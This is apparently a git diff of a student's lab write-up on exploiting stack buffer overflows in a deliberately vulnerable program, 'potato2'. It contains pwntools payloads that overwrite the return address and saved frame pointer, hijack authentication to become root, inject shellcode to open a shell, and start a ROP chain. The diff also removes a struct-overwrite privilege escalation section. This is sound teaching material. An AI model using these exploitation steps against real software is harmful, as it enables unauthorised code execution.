@@ -1,5 +1,5 @@
 Student: Ernst Schwaiger
-Date 2024-03-23
+Date 2024-04-05
 
 # Stack Corruption
 
@@ -133,17 +133,12 @@ potato2/src/userlist.c:260:                     strcpy(parsed_user->shell, token
 potato2/src/userlist.c:266:       token = strtok(NULL, ":");
 ```
 
-The code at `func.c`, line 187 look promising. The function `fscanf` in `change_name()` reads
+The code at `func.c`, line 187 looks promising. The function `fscanf` in `change_name()` reads
 a string from `stdin` and stores it in `input_username`. If the user
 enters more than `USERNAME_LENGTH` characters, a buffer overflow happens. By providing more
 bytes than `input_username` can hold, the return address in the stack frame can be overwritten 
-by a user-chosen value.
-
-The subsequent statement puts the string terminator character at the first position in the 
-passed string which holds a linefeed `0xa`, character. This is particularly relevant for the injection
-of shellcode. One the one hand side, we can exploit that to inject a zero-byte in our shellcode
-(we can't inject that via `stdin`), on the other side, we have to avoid that byte in our shellcode 
-if we don't want to have our shellcode changed.
+by a user-chosen address. This will redirect the path of execution to that address once the
+execution of `change_name()` finishes.
 
 ```c
 void
@@ -161,24 +156,7 @@ change_name()
 }
 ```
 
-The `strncpy()` call also provides a vulnerability for overwriting the heap. It copies the provided
-username into the global buffer which holds the name of the currently logged-in user. Since it 
-only checks for the length of the provided string, not for the size of the length field of the 
-username, it is possible to overwrite the user structure as well:
-
-```c
-struct _user
-{
-     char name[20];
-     char password_hash[32]; // md5
-     int id;
-     int gid;
-     char home[50];
-     char shell[50];
-} typedef t_user;
-```
-
-## Setup of the debugging environment
+## Setup of the debugging environment, run a buffer overflow
 
 Start a python virtual environment, install the `pwntools` package.
 
@@ -186,7 +164,6 @@ Start a python virtual environment, install the `pwntools` package.
 virtualenv venv
 . ./venv/bin/activate
 pip install pwntools
-python3 pwn_potato2.py
 ```
 
 Change the `elf` variable in `pwn_potato2.py` such that it runs the binary `./potato` in the current
@@ -227,12 +204,13 @@ p.sendline(payload)
 p.interactive()
 ```
 
-The python script is executed via `python3 pwn_potato2.py`, or directly via `./pwn_potato2.py`.
+The python script which starts the `potato` app via `gdb` is executed via `python3 pwn_potato2.py`, or directly via `./pwn_potato2.py`.
 
 In the `gef` window, we issue `ni` which steps over the next assembly statement, then press enter a few times
 until the debugger halts at the `ret` statement. In the next step, the debugger will set the instruction pointer
 to the content of whatever is at the address pointed to by the `$esp` register. Printing the address can be done
-by `x/4bx $esp`.
+by `x/4bx $esp`. Continue code execution by entering `c`; this will stop the application with a segfault 
+as `0x41414141` is not mapped in the virtual memory of the running process.
 
 ```gdb
 x/4bx $esp 
@@ -243,8 +221,8 @@ x/4bx $esp
 
 The return address was successfully overwritten by 'A's. Currently it is not known exactly, which of the 100 'A's
 have overwritten the return address. The `gef` debugger can generate a unique string pattern which will be helpful 
-to find that out. Run `pattern create` in the `gef` prompt to obtain that pattern, then copy it into 
-`pwn_potato2.py`as follows:
+to find that out. Run the python script again, enter `pattern create` in the `gef` prompt to obtain that pattern,
+then copy it into `pwn_potato2.py`as follows:
 
 ```python
 # ...
@@ -267,7 +245,7 @@ payload=b"\x41"*62+p32(0x0804b108)
 ```
 
 Stop debugger and python, re-run the python script, in the debugger, press `c` (continue). In the python shell,
-the output of `whoami()` with the changed username is displayed. The debugger stopped with a segfault. This
+the output of `whoami()` with the changed username is displayed. The process again stops with a segfault. This
 is due to the fact that the current payload still invalidates the address of the previous stack frame, which
 is stored in `$ebp`. In order to prevent that, we need to find out its position in the payload and its content 
 in a non-overflow scenario, then put that value at the proper position in the payload.
@@ -282,36 +260,6 @@ With that new knowledge, the payload can be adapted again:
 # ...
 payload=b"\x41"*58 + b"\x38\xce\xff\xff" + p32(0x0804b108)
 # ...
-```
-
-## become privileged user without changing execution path (not requested)
-
-It is possible to get privileged user credentialy without overwriting the stack return address. If we
-overwrite the global user data structure such that we obtain a user id of zero, we get the credentials
-without crashing the potato2 application at all. For that purpose, we exploit the fact that the `strncpy()`
-functon always appends the string terminator `0x00` to the taget string:
-
-```python
-# ...
-# overwrite user structure with user-chosen id: 0
-# This overwrites the bytes of the global user-id via the strncpy() call in func.c, 190
-# since strncpy adds a null terminator at session.logged_in_user->name[54]
-p.sendline(b"changename")
-payload=b"\x41"*50 + b"\x42"*3 + b"\x0a"
-p.sendline(payload)
-
-# Repeat the same for session.logged_in_user->name[53]
-p.sendline(b"changename")
-payload=b"\x41"*50 + b"\x42"*2 + b"\x0a"
-p.sendline(payload)
-
-# Set our name back to peter
-p.sendline(b"changename")
-payload=b"peter" + b"\x0a"
-p.sendline(payload)
-p.interactive()
-# At this point, we can use potato interactively again, but our user id is zero, 
-# i.e. we are a "privileged user" and are allowed, e.g. to delete other users.
 ```
 
 ## change the execution flow to get authenticated for a privileged user
@@ -382,7 +330,7 @@ $ objdump -Sd potato | grep -C5 -w "session.logged_in_user = user;"
 The address is `0x804af24`. The first assembly statement writes the content of `(%ebp - 0xc)` into `%eax`. After
 that statement, `%eax` holds the right hand side of the assignment statement. The address of the desired `root`
 user can be found out by putting a breakpoint after `init()` was called, then by issuing `p user_list->head->user`,
-which yieds `0x8050370`. That value must be copied onto `(%ebp - 0xc)`.
+which yields `0x8050370`. That value must be copied onto `(%ebp - 0xc)`.
 
 The left hand side of the assignment is `%ebx + 0x11c`. To find out the content of `%ebx`, set a breakpoint at 
 the assignment statement, run `potato` normally and print the register content: `p $ebx`, which yields `0x804dff4`.
@@ -431,7 +379,7 @@ payload=b"\x41"*50              # input_name \
 For executing shellcode, the code must be injected into the overflowing buffer, and the return
 address must be overwritten by an address in that buffer. The shellcode must be small enough to
 fit in the overwritten buffer, which is 50 bytes in length.
-This shellcode https://www.exploit-db.com/shellcodes/49768 must me modified slightly so it can
+This shellcode https://www.exploit-db.com/shellcodes/49768 must be modified slightly so it can
 be used in the potato2 context:
 
 ```asm
@@ -458,7 +406,7 @@ This can be translated into a sequence of bytes via `nasm -f elf32 -l listfile.l
 
 The byte sequence in `listfile.list` is the shellcode to inject on the buffer. Moreover,
 the return address must be overwritten with the start of the injected shellcode.
-In the example below, the shellcode is put at the beginning of `input_username, so
+In the example below, the shellcode is put at the beginning of `input_username`, so
 the return address must point there. The address can be retrieved by `p $input_username`
 in the debugger, in the example below, it is `0xffffccde`:
 ```python
@@ -524,9 +472,9 @@ Running this script will open up a shell in the terminal that runs the `potato` 
 For the generation of a ROP/Return Oriented Programming attack, the `ROPgadget` or `Ropper` Python
 libraries can be used. This example uses `ROPgadget`. It must be installed in the Python virtual
 environment, then it can be used to scan the binary for gadgets and for creating a ROP chain. 
-A gadget is a sequence of assembly statements which achieve a certain effect, they may e.g. write a certain 
-value into a certain processor register. That sequence must be followed by a ret statement. 
-A sequence of these gadgets that opens, for instance a shell, is called a ROP chain.
+A gadget is a sequence of assembly statements which achieve a certain effect, they may e.g. write a specified 
+value into a processor register. That sequence usually ends with a `ret` assembler statement. 
+A sequence of gadgets is called a ROP chain. A ROP chain can be designed, for instance to open a shell. 
 
 ```bash
 . ./venv/bin/activate
